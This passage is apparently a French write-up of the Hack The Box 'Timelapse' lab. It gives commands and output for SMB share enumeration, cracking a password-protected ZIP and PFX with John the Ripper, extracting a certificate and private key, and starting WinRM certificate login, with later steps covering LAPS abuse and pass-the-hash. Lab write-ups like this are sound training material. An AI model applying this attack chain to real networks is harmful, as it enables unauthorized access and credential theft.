+                    <a href="#11-outils-utilis%c3%a9s" aria-label="1️⃣1️⃣ OUTILS UTILISÉS">1️⃣1️⃣ OUTILS UTILISÉS</a></li>
+                <li>
+                    <a href="#12-le%c3%a7ons-apprises" aria-label="1️⃣2️⃣ LEÇONS APPRISES">1️⃣2️⃣ LEÇONS APPRISES</a><ul>
+                        
+                <li>
+                    <a href="#-bonnes-pratiques-offensives" aria-label="✅ Bonnes Pratiques Offensives">✅ Bonnes Pratiques Offensives</a></li>
+                <li>
+                    <a href="#-vuln%c3%a9rabilit%c3%a9s-critiques-identifi%c3%a9es" aria-label="❌ Vulnérabilités Critiques Identifiées">❌ Vulnérabilités Critiques Identifiées</a></li>
+                <li>
+                    <a href="#-recommandations-d%c3%a9fensives-prioritaires" aria-label="🛡️ Recommandations Défensives Prioritaires">🛡️ Recommandations Défensives Prioritaires</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-ressources" aria-label="📚 RESSOURCES">📚 RESSOURCES</a><ul>
+                        
+                <li>
+                    <a href="#documentation-officielle" aria-label="Documentation Officielle">Documentation Officielle</a></li>
+                <li>
+                    <a href="#outils-et-frameworks" aria-label="Outils et Frameworks">Outils et Frameworks</a></li>
+                <li>
+                    <a href="#articles-et-recherches" aria-label="Articles et Recherches">Articles et Recherches</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-sch%c3%a9ma-dexploitation" aria-label="📊 SCHÉMA D&rsquo;EXPLOITATION">📊 SCHÉMA D&rsquo;EXPLOITATION</a></li>
+                <li>
+                    <a href="#-flags" aria-label="🏁 FLAGS">🏁 FLAGS</a></li>
+                <li>
+                    <a href="#-notes-finales" aria-label="📝 NOTES FINALES">📝 NOTES FINALES</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="-résumé-exécutif">📋 Résumé Exécutif<a hidden class="anchor" aria-hidden="true" href="#-résumé-exécutif">#</a></h2>
+<p><strong>Machine :</strong> Timelapse (10.10.11.152)<br>
+<strong>OS :</strong> Windows Server 2019<br>
+<strong>Domaine :</strong> timelapse.htb / DC01.timelapse.htb<br>
+<strong>Difficulté :</strong> Easy<br>
+<strong>Points Clés :</strong> SMB Anonymous, PFX Certificate, WinRM Auth, PowerShell History, LAPS Abuse</p>
+<h3 id="-chaîne-dattaque-complète">🔗 Chaîne d&rsquo;Attaque Complète<a hidden class="anchor" aria-hidden="true" href="#-chaîne-dattaque-complète">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>SMB Anonymous Access
+</span></span><span style="display:flex;"><span>    ↓ [Partage &#34;Shares&#34;]
+</span></span><span style="display:flex;"><span>winrm_backup.zip (password-protected)
+</span></span><span style="display:flex;"><span>    ↓ [zip2john + john → supremelegacy]
+</span></span><span style="display:flex;"><span>legacyy_dev_auth.pfx (encrypted)
+</span></span><span style="display:flex;"><span>    ↓ [pfx2john + john → thuglegacy]
+</span></span><span style="display:flex;"><span>Certificate SSL + Private Key
+</span></span><span style="display:flex;"><span>    ↓ [WinRM Certificate Auth]
+</span></span><span style="display:flex;"><span>legacyy (utilisateur domain)
+</span></span><span style="display:flex;"><span>    ↓ [PowerShell ConsoleHost_history.txt]
+</span></span><span style="display:flex;"><span>svc_deploy credentials (cleartext)
+</span></span><span style="display:flex;"><span>    ↓ [Membre de LAPS_Readers]
+</span></span><span style="display:flex;"><span>LAPS Password Administrator
+</span></span><span style="display:flex;"><span>    ↓ [impacket-secretsdump]
+</span></span><span style="display:flex;"><span>Hash NTLM de TRX
+</span></span><span style="display:flex;"><span>    ↓ [Pass-the-Hash]
+</span></span><span style="display:flex;"><span>TRX → Root Flag
+</span></span></code></pre></div><hr>
+<h2 id="1-reconnaissance">1️⃣ RECONNAISSANCE<a hidden class="anchor" aria-hidden="true" href="#1-reconnaissance">#</a></h2>
+<h3 id="-scan-nmap">🔍 Scan Nmap<a hidden class="anchor" aria-hidden="true" href="#-scan-nmap">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Scan rapide des ports</span>
+</span></span><span style="display:flex;"><span>nmap -p- --min-rate <span style="color:#ae81ff">10000</span> 10.10.11.152
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Scan détaillé</span>
+</span></span><span style="display:flex;"><span>nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389 -sCV 10.10.11.152 -oN nmap.txt
+</span></span></code></pre></div><p><strong>Résultats :</strong></p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Version</th>
+<th>Rôle</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>53</td>
+<td>DNS</td>
+<td>Simple DNS Plus</td>
+<td>Résolution de noms</td>
+</tr>
+<tr>
+<td>88</td>
+<td>Kerberos</td>
+<td>Microsoft Windows Kerberos</td>
+<td>Authentification AD</td>
+</tr>
+<tr>
+<td>135</td>
+<td>MSRPC</td>
+<td>Microsoft Windows RPC</td>
+<td>Communication RPC</td>
+</tr>
+<tr>
+<td>139</td>
+<td>NetBIOS-SSN</td>
+<td>Microsoft Windows NetBIOS</td>
+<td>Partage fichiers (legacy)</td>
+</tr>
+<tr>
+<td>389</td>
+<td>LDAP</td>
+<td>Microsoft AD LDAP</td>
+<td>Annuaire Active Directory</td>
+</tr>
+<tr>
+<td>445</td>
+<td>SMB</td>
+<td>Microsoft-DS (Windows Server 2019)</td>
+<td>Partage fichiers moderne</td>
+</tr>
+<tr>
+<td>464</td>
+<td>kpasswd5</td>
+<td>-</td>
+<td>Changement mot de passe Kerberos</td>
+</tr>
+<tr>
+<td>593</td>
+<td>HTTP-RPC</td>
+<td>Microsoft Windows RPC over HTTP</td>
+<td>RPC via HTTP</td>
+</tr>
+<tr>
+<td>636</td>
+<td>LDAPS</td>
+<td>-</td>
+<td>LDAP sécurisé (SSL/TLS)</td>
+</tr>
+<tr>
+<td>3268</td>
+<td>Global Catalog</td>
+<td>Microsoft AD LDAP</td>
+<td>Catalogue global AD</td>
+</tr>
+<tr>
+<td>3269</td>
+<td>GC-SSL</td>
+<td>-</td>
+<td>Catalogue global sécurisé</td>
+</tr>
+<tr>
+<td>5986</td>
+<td>WinRM-HTTPS</td>
+<td>Microsoft HTTPAPI 2.0</td>
+<td>PowerShell Remoting (SSL)</td>
+</tr>
+<tr>
+<td>9389</td>
+<td>ADWS</td>
+<td>.NET Message Framing</td>
+<td>AD Web Services</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Identification :</strong></p>
+<ul>
+<li><strong>Domaine :</strong> timelapse.htb</li>
+<li><strong>Hostname :</strong> DC01.timelapse.htb</li>
+<li><strong>Rôle :</strong> Domain Controller Windows Server 2019</li>
+<li><strong>WinRM :</strong> Port 5986 (HTTPS uniquement, pas de port 5985)</li>
+<li><strong>Certificat SSL :</strong> CN=DC01.timelapse.htb</li>
+</ul>
+<p><strong>⏰ Décalage Horaire :</strong> +59min 53s</p>
+<blockquote>
+<p><strong>⚠️ Note Importante :</strong> Le décalage horaire peut causer des échecs d&rsquo;authentification Kerberos (erreur KRB_AP_ERR_SKEW). Synchronisation recommandée :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ntpdate -s 10.10.11.152
+</span></span></code></pre></div></blockquote>
+<h3 id="-configuration-etchosts">📝 Configuration /etc/hosts<a hidden class="anchor" aria-hidden="true" href="#-configuration-etchosts">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;10.10.11.152 dc01.timelapse.htb timelapse.htb&#34;</span> | sudo tee -a /etc/hosts
+</span></span></code></pre></div><hr>
+<h2 id="2-énumération-smb">2️⃣ ÉNUMÉRATION SMB<a hidden class="anchor" aria-hidden="true" href="#2-énumération-smb">#</a></h2>
+<h3 id="-quest-ce-que-smb-">🎓 Qu&rsquo;est-ce que SMB ?<a hidden class="anchor" aria-hidden="true" href="#-quest-ce-que-smb-">#</a></h3>
+<p><strong>SMB (Server Message Block)</strong> est le protocole de partage de fichiers et imprimantes de Microsoft.</p>
+<p><strong>Versions :</strong></p>
+<ul>
+<li>SMBv1 : Obsolète, vulnérable (EternalBlue, etc.)</li>
+<li>SMBv2/3 : Moderne, chiffrement supporté</li>
+</ul>
+<p><strong>Vecteurs d&rsquo;attaque courants :</strong></p>
+<ul>
+<li>✅ Accès anonyme (null session)</li>
+<li>✅ Énumération des utilisateurs</li>
+<li>✅ Partages mal sécurisés</li>
+<li>✅ Fichiers sensibles accessibles</li>
+</ul>
+<h3 id="-énumération-des-partages">🔎 Énumération des Partages<a hidden class="anchor" aria-hidden="true" href="#-énumération-des-partages">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Liste des partages avec accès anonyme</span>
+</span></span><span style="display:flex;"><span>smbclient -L //10.10.11.152 -N
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Alternative avec netexec</span>
+</span></span><span style="display:flex;"><span>netexec smb 10.10.11.152 --shares -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span>
+</span></span></code></pre></div><p><strong>Résultat :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>---------       ----      -------
+</span></span><span style="display:flex;"><span>ADMIN$          Disk      Remote Admin
+</span></span><span style="display:flex;"><span>C$              Disk      Default share
+</span></span><span style="display:flex;"><span>IPC$            IPC       Remote IPC
+</span></span><span style="display:flex;"><span>NETLOGON        Disk      Logon server share 
+</span></span><span style="display:flex;"><span>Shares          Disk      ⭐ Partage personnalisé !
+</span></span><span style="display:flex;"><span>SYSVOL          Disk      Logon server share
+</span></span></code></pre></div><p><strong>Analyse :</strong></p>
+<table>
+<thead>
+<tr>
+<th>Partage</th>
+<th>Accès Anonyme</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ADMIN$</td>
+<td>❌</td>
+<td>Partage administratif (C:\Windows)</td>
+</tr>
+<tr>
+<td>C$</td>
+<td>❌</td>
+<td>Racine du disque C:\</td>
+</tr>
+<tr>
+<td>IPC$</td>
+<td>✅ (lecture)</td>
+<td>Inter-Process Communication</td>
+</tr>
+<tr>
+<td>NETLOGON</td>
+<td>❌</td>
+<td>Scripts de connexion domaine</td>
+</tr>
+<tr>
+<td><strong>Shares</strong></td>
+<td><strong>✅ (lecture/écriture)</strong></td>
+<td><strong>Partage personnalisé suspect</strong></td>
+</tr>
+<tr>
+<td>SYSVOL</td>
+<td>❌</td>
+<td>Stratégies de groupe (GPO)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="-exploration-du-partage-shares">📁 Exploration du Partage &ldquo;Shares&rdquo;<a hidden class="anchor" aria-hidden="true" href="#-exploration-du-partage-shares">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient //10.10.11.152/Shares -N
+</span></span></code></pre></div><p><strong>Navigation :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>smb: \&gt; ls
+</span></span><span style="display:flex;"><span>  .                                   D        0  Mon Oct 25 17:39:15 2021
+</span></span><span style="display:flex;"><span>  ..                                  D        0  Mon Oct 25 17:39:15 2021
+</span></span><span style="display:flex;"><span>  Dev                                 D        0  Mon Oct 25 21:40:06 2021
+</span></span><span style="display:flex;"><span>  HelpDesk                            D        0  Mon Oct 25 17:48:42 2021
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>smb: \&gt; cd Dev
+</span></span><span style="display:flex;"><span>smb: \Dev\&gt; ls
+</span></span><span style="display:flex;"><span>  winrm_backup.zip                    A     2611  Mon Oct 25 17:46:42 2021
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>smb: \Dev\&gt; get winrm_backup.zip
+</span></span></code></pre></div><p><strong>💡 Découverte Critique :</strong> Fichier <code>winrm_backup.zip</code> dans le dossier Dev !</p>
+<p><strong>Indices :</strong></p>
+<ul>
+<li>Nom du fichier → Backup WinRM (credentials/certificats probable)</li>
+<li>Dossier &ldquo;Dev&rdquo; → Environnement de développement (souvent moins sécurisé)</li>
+<li>Accès anonyme → Mauvaise configuration de sécurité</li>
+</ul>
+<hr>
+<h2 id="3-cracking---zip-et-pfx">3️⃣ CRACKING - ZIP ET PFX<a hidden class="anchor" aria-hidden="true" href="#3-cracking---zip-et-pfx">#</a></h2>
+<h3 id="-étape-1--cracking-du-zip">🔓 Étape 1 : Cracking du ZIP<a hidden class="anchor" aria-hidden="true" href="#-étape-1--cracking-du-zip">#</a></h3>
+<p><strong>🎯 Objectif :</strong> Le fichier ZIP est protégé par mot de passe.</p>
+<p><strong>Vérification :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>unzip winrm_backup.zip
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Archive:  winrm_backup.zip</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># [winrm_backup.zip] legacyy_dev_auth.pfx password:</span>
+</span></span></code></pre></div><p><strong>Conversion pour John :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>zip2john winrm_backup.zip &gt; zip.john
+</span></span></code></pre></div><p><strong>Contenu du hash :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>winrm_backup.zip/legacyy_dev_auth.pfx:$pkzip2$1*1*2*0*a33*9fb*...
+</span></span></code></pre></div><p><strong>Cracking :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john zip.john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p><strong>Résultat (3 secondes) :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded 1 password hash (PKZIP [32/64])
+</span></span><span style="display:flex;"><span>Will run 4 OpenMP threads
+</span></span><span style="display:flex;"><span>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span><span style="display:flex;"><span>supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
+</span></span><span style="display:flex;"><span>1g 0:00:00:03 DONE (2025-12-13 14:15) 0.2777g/s 9631Kp/s 9631Kc/s 9631KC/s
+</span></span></code></pre></div><p><strong>🔑 Mot de passe ZIP :</strong> <code>supremelegacy</code></p>
+<p><strong>Extraction :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>unzip winrm_backup.zip
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Archive:  winrm_backup.zip</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># [winrm_backup.zip] legacyy_dev_auth.pfx password: supremelegacy</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># extracting: legacyy_dev_auth.pfx</span>
+</span></span></code></pre></div><h3 id="-étape-2--analyse-du-fichier-pfx">📜 Étape 2 : Analyse du Fichier PFX<a hidden class="anchor" aria-hidden="true" href="#-étape-2--analyse-du-fichier-pfx">#</a></h3>
+<p><strong>🎓 Qu&rsquo;est-ce qu&rsquo;un fichier PFX/P12 ?</strong></p>
+<p><strong>PFX (Personal Information Exchange)</strong> = <strong>PKCS#12</strong> est un format de conteneur cryptographique qui stocke :</p>
+<ol>
+<li>
+<p><strong>Certificat X.509</strong> (partie publique)</p>
+<ul>
+<li>Identifie le propriétaire</li>
+<li>Contient la clé publique</li>
+<li>Signé par une CA (Certificate Authority)</li>
+</ul>
+</li>
+<li>
+<p><strong>Clé privée RSA/ECC</strong> (partie privée)</p>
+<ul>
+<li>Permet le déchiffrement</li>
+<li>Permet la signature numérique</li>
+<li><strong>DOIT rester secrète !</strong></li>
+</ul>
+</li>
+<li>
+<p><strong>Chaîne de certificats</strong> (optionnel)</p>
+<ul>
+<li>Certificats intermédiaires</li>
+<li>Certificat racine (Root CA)</li>
+</ul>
+</li>
+</ol>
+<p><strong>Usages courants :</strong></p>
+<table>
+<thead>
+<tr>
+<th>Contexte</th>
+<th>Usage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WinRM/PowerShell</strong></td>
+<td>Authentification par certificat</td>
+</tr>
+<tr>
+<td><strong>IIS/Web Servers</strong></td>
+<td>Certificats SSL/TLS (HTTPS)</td>
+</tr>
+<tr>
+<td><strong>VPN</strong></td>
+<td>Authentification client</td>
+</tr>
+<tr>
+<td><strong>Code Signing</strong></td>
+<td>Signature d&rsquo;applications</td>
+</tr>
+<tr>
+<td><strong>S/MIME</strong></td>
+<td>Chiffrement d&rsquo;emails</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Inspection du PFX :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Lister le contenu sans extraire</span>
+</span></span><span style="display:flex;"><span>openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -info
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enter Import Password: [demande le mot de passe]</span>
+</span></span></code></pre></div><p><strong>❌ Problème :</strong> Le PFX lui-même est protégé par un mot de passe !</p>
+<h3 id="-étape-3--cracking-du-pfx">🔓 Étape 3 : Cracking du PFX<a hidden class="anchor" aria-hidden="true" href="#-étape-3--cracking-du-pfx">#</a></h3>
+<p><strong>Conversion pour John :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx &gt; pfx.john
+</span></span></code></pre></div><p><strong>⚠️ Erreur Potentielle :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Traceback (most recent call last):
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/share/john/pfx2john.py&#34;</span>, line <span style="color:#ae81ff">5</span>, <span style="color:#f92672">in</span> <span style="color:#f92672">&lt;</span>module<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">from</span> asn1crypto <span style="color:#f92672">import</span> cms
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ModuleNotFoundError</span>: No module named <span style="color:#e6db74">&#39;asn1crypto&#39;</span>
+</span></span></code></pre></div><p><strong>Solution :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Installation du package système</span>
+</span></span><span style="display:flex;"><span>sudo apt install python3-asn1crypto -y
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Vérification</span>
+</span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;import asn1crypto; print(&#39;OK&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># OK</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Réessayer</span>
+</span></span><span style="display:flex;"><span>python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx &gt; pfx.john
+</span></span></code></pre></div><p><strong>Cracking :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john pfx.john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p><strong>Résultat (5 secondes) :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded 1 password hash (pfx [PKCS12 PBE SHA1/SHA2 AES/3DES 256/256 AVX2 8x])
+</span></span><span style="display:flex;"><span>Will run 4 OpenMP threads
+</span></span><span style="display:flex;"><span>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span><span style="display:flex;"><span>thuglegacy       (legacyy_dev_auth.pfx)
+</span></span><span style="display:flex;"><span>1g 0:00:00:05 DONE (2025-12-13 14:18) 0.1960g/s 632889p/s 632889c/s 632889C/s
+</span></span></code></pre></div><p><strong>🔑 Mot de passe PFX :</strong> <code>thuglegacy</code></p>
+<h3 id="-étape-4--extraction-certificat-et-clé-privée">🔐 Étape 4 : Extraction Certificat et Clé Privée<a hidden class="anchor" aria-hidden="true" href="#-étape-4--extraction-certificat-et-clé-privée">#</a></h3>
+<p><strong>Extraction de la clé privée :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl pkcs12 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -in legacyy_dev_auth.pfx <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -nocerts <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -out key.pem <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -nodes
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enter Import Password: thuglegacy</span>
+</span></span></code></pre></div><p><strong>Flags expliqués :</strong></p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Signification</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-in</code></td>
+<td>Fichier PFX source</td>
+</tr>
+<tr>
+<td><code>-nocerts</code></td>
+<td>Exporter <strong>uniquement</strong> la clé privée (pas les certificats)</td>
+</tr>
+<tr>
+<td><code>-out</code></td>
+<td>Fichier de sortie</td>
+</tr>
+<tr>
+<td><code>-nodes</code></td>
+<td><strong>No DES</strong> - Ne pas chiffrer la clé exportée (stockage en clair)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>⚠️ Sécurité :</strong> Le flag <code>-nodes</code> produit une clé privée <strong>non chiffrée</strong>. En production, utiliser <code>-des3</code> ou <code>-aes256</code> pour chiffrer la clé exportée.</p>
+<p><strong>Extraction du certificat :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl pkcs12 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -in legacyy_dev_auth.pfx <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -nokeys <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -out cert.pem
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enter Import Password: thuglegacy</span>
+</span></span></code></pre></div><p><strong>Flags expliqués :</strong></p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Signification</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-nokeys</code></td>
+<td>Exporter <strong>uniquement</strong> le certificat (pas la clé privée)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Vérification des fichiers générés :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -lh *.pem
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -rw------- 1 kali kali 1.9K Dec 13 14:20 cert.pem</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -rw------- 1 kali kali 1.7K Dec 13 14:19 key.pem</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Inspecter le certificat</span>
+</span></span><span style="display:flex;"><span>openssl x509 -in cert.pem -text -noout
+</span></span></code></pre></div><p><strong>Informations du certificat :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Subject: CN=Legacyy
+</span></span><span style="display:flex;"><span>Issuer: CN=timelapse-DC01-CA
+</span></span><span style="display:flex;"><span>Validity:
+</span></span><span style="display:flex;"><span>    Not Before: Oct 25 14:05:37 2021 GMT
+</span></span><span style="display:flex;"><span>    Not After : Oct 25 14:25:37 2031 GMT  ⬅️ Valide 10 ans !
+</span></span><span style="display:flex;"><span>Subject Alternative Name: 
+</span></span><span style="display:flex;"><span>    othername: UPN::legacyy@timelapse.htb  ⬅️ Username AD !
+</span></span></code></pre></div><p><strong>💡 Découvertes Importantes :</strong></p>
+<ol>
+<li><strong>Nom d&rsquo;utilisateur :</strong> <a href="mailto:legacyy@timelapse.htb">legacyy@timelapse.htb</a></li>
+<li><strong>CA :</strong> timelapse-DC01-CA (CA interne du domaine)</li>
+<li><strong>UPN (User Principal Name) :</strong> <a href="mailto:legacyy@timelapse.htb">legacyy@timelapse.htb</a></li>
+<li><strong>Usage :</strong> Client Authentication (EKU 1.3.6.1.5.5.7.3.2)</li>
+</ol>
+<hr>
+<h2 id="4-accès-initial---winrm-certificate-auth">4️⃣ ACCÈS INITIAL - WINRM CERTIFICATE AUTH<a hidden class="anchor" aria-hidden="true" href="#4-accès-initial---winrm-certificate-auth">#</a></h2>
+<h3 id="-quest-ce-que-winrm-">🎓 Qu&rsquo;est-ce que WinRM ?<a hidden class="anchor" aria-hidden="true" href="#-quest-ce-que-winrm-">#</a></h3>
+<p><strong>Windows Remote Management (WinRM)</strong> est l&rsquo;implémentation Microsoft du protocole <strong>WS-Management</strong> (Web Services for Management).</p>
+<p><strong>Fonctionnalités :</strong></p>
+<ul>
+<li>Exécution de commandes PowerShell à distance</li>
+<li>Administration de serveurs Windows sans RDP</li>
+<li>Automatisation de tâches (scripts, déploiements)</li>
+<li>Collecte d&rsquo;informations système</li>
+</ul>
+<p><strong>Ports par défaut :</strong></p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Protocole</th>
+<th>Chiffrement</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>5985</td>
+<td>HTTP</td>
+<td>❌ Clair (non recommandé en production)</td>
+</tr>
+<tr>
+<td>5986</td>
+<td>HTTPS</td>
+<td>✅ TLS/SSL</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Prérequis d&rsquo;accès :</strong></p>
+<ul>
+<li>Membre du groupe <strong>Remote Management Users</strong></li>
+<li>OU administrateur local/domaine</li>
+<li>Pare-feu autorisant le port 5985/5986</li>
+</ul>
+<h3 id="-méthodes-dauthentification-winrm">🔐 Méthodes d&rsquo;Authentification WinRM<a hidden class="anchor" aria-hidden="true" href="#-méthodes-dauthentification-winrm">#</a></h3>
+<table>
+<thead>
+<tr>
+<th>Méthode</th>
+<th>Description</th>
+<th>Sécurité</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Basic</strong></td>
+<td>Username + Password (Base64)</td>
+<td>⚠️ Faible (clear text)</td>
+</tr>
+<tr>
+<td><strong>Kerberos</strong></td>
+<td>Ticket-based (AD)</td>
+<td>✅ Fort</td>
+</tr>
+<tr>
